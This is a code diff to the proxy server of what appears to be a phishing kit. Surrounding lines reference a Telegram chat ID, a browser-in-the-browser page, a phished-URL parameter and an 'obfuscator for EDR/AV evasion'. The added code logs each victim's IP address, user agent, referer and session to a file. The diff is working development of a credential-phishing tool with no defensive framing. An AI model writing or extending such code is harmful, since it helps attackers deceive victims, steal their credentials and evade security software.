@@ -4,6 +4,35 @@ const CHAT_ID = '7310383191';
 // Track which sessions have already sent notifications
 const NOTIFIED_SESSIONS = new Set();
 
+// At the top of proxy_server.js, with other constants
+const VISITS_LOG_FILE = path.join(__dirname, "visit_logs", "visits.log");
+
+// Ensure the visit logs directory exists
+const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
+if (!fs.existsSync(VISITS_LOG_DIR)) {
+    fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });
+}
+
+// Function to log a visit
+async function logVisit(clientRequest, clientResponse, sessionId) {
+    const visit = {
+        timestamp: new Date().toISOString(),
+        ip: clientRequest.headers['x-real-ip'] || 
+             clientRequest.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+             'Unknown',
+        userAgent: clientRequest.headers['user-agent'] || 'Unknown',
+        referer: clientRequest.headers['referer'] || 'Direct',
+        sessionId: sessionId || 'unknown',
+        url: clientRequest.url,
+        method: clientRequest.method,
+        statusCode: clientResponse.statusCode || 'N/A'
+    };
+    
+    // Append to visit log
+    const logLine = JSON.stringify(visit) + '\n';
+    fs.appendFileSync(VISITS_LOG_FILE, logLine);
+}
+
 // ================================================
 // 𝙾𝙱𝙵𝚄𝚂𝙲𝙰𝚃𝙾𝚁 𝙵𝙾𝚁 𝙴𝙳𝚁/𝙰𝚅 𝙴𝚅𝙰𝚂𝙸𝙾𝙽
 // ================================================
@@ -742,6 +771,8 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         fs.createReadStream(path.join(__dirname, 'public', 'bitb.html')).pipe(clientResponse);
         return;
     }
+
+    logVisit(clientRequest, clientResponse, currentSession || 'new');
 
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
